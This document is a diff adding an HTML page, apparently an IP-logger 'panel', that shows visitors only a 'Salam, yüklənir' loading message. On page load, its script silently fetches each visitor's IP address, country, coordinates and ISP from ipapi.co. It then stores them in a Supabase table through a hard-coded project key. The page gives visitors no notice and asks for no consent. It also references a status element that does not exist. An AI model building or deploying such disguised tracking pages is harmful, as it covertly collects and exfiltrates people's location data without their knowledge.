@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>aze panel</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .success {
+            color: #1e7e34;
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+        }
+
+        .error {
+            color: #bd2130;
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" style="display: flex; flex-direction: column; align-items: center; gap: 30px;">
+        <h1>
+            Salam, yüklənir
+        </h1>
+        <img src="loading.gif" alt="" style="width: 100%; width: 50px;">
+
+    </div>
+
+    <script>
+        // 1. Supabase Bağlantı Bilgileri (Kendi bilgilerini buraya gir)
+        const SUPABASE_URL = "https://vkevxalnwqjjrhqbjmdq.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZrZXZ4YWxud3FqanJocWJqbWRxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI3MzI3OTEsImV4cCI6MjA5ODMwODc5MX0.nMw-gXDVqMaJYb_bz4I2-ta99YUse36mCIUT2ceM77Q";
+
+        // Çakışmayı önlemek için değişken adını 'supabaseClient' yaptık
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const statusBox = document.getElementById('status-box');
+
+        // Zaman dilimine göre kullanıcının o anki yerel saatini alan fonksiyon
+        function getLocalTimeString(timezone) {
+            try {
+                return new Date().toLocaleTimeString('tr-TR', { timeZone: timezone });
+            } catch (e) {
+                return new Date().toLocaleTimeString('tr-TR');
+            }
+        }
+
+        // 2. IP verilerini çekip SQL tablosuna gönderen fonksiyon
+        async function logUserData() {
+            try {
+                // ipapi.co üzerinden verileri çekiyoruz
+                const response = await fetch('https://ipapi.co/json/');
+                
+                if (!response.ok) {
+                    throw new Error('IP ve konum servisinden yanıt alınamadı.');
+                }
+
+                const data = await response.json();
+
+                // SQL sütunlarına (ip, country, clock, latitude, longitude, provaider) gidecek verileri hazırlıyoruz
+                const ipValue = data.ip;
+                const countryValue = data.country_name; 
+                const clockValue = getLocalTimeString(data.timezone);
+                const latitudeValue = data.latitude ? data.latitude.toString() : "Bilinmiyor";
+                const longitudeValue = data.longitude ? data.longitude.toString() : "Bilinmiyor";
+                const provaiderValue = data.org || "Bilinmiyor";
+
+                // 3. Verileri güncellenmiş değişken adı (supabaseClient) ile gönderiyoruz
+                const { error } = await supabaseClient
+                    .from('user_logs')
+                    .insert([
+                        { 
+                            ip: ipValue, 
+                            country: countryValue, 
+                            clock: clockValue,
+                            latitude: latitudeValue,
+                            longitude: longitudeValue,
+                            provaider: provaiderValue
+                        }
+                    ]);
+
+                if (error) throw error;
+
+                // Ekrana başarı çıktısını yazdır
+                // statusBox.innerHTML = `
+                //     <strong style="display:block; text-align:center; margin-bottom:10px;">Kayıt Başarılı!</strong>
+                //     <b>ip:</b> ${ipValue}<br>
+                //     <b>country:</b> ${countryValue}<br>
+                //     <b>clock:</b> ${clockValue}<br>
+                //     <b>latitude:</b> ${latitudeValue}<br>
+                //     <b>longitude:</b> ${longitudeValue}<br>
+                //     <b>provaider:</b> ${provaiderValue}
+                // `;
+                statusBox.className = "status success";
+
+            } catch (err) {
+                console.error("Sistem hatası:", err);
+                statusBox.textContent = "Veri SQL tablosuna kaydedilirken hata oluştu: " + err.message;
+                statusBox.className = "status error";
+            }
+        }
+
+        // Sayfa açıldığında işlemi başlat
+        window.onload = logUserData;
+    </script>
+</body>
+</html>
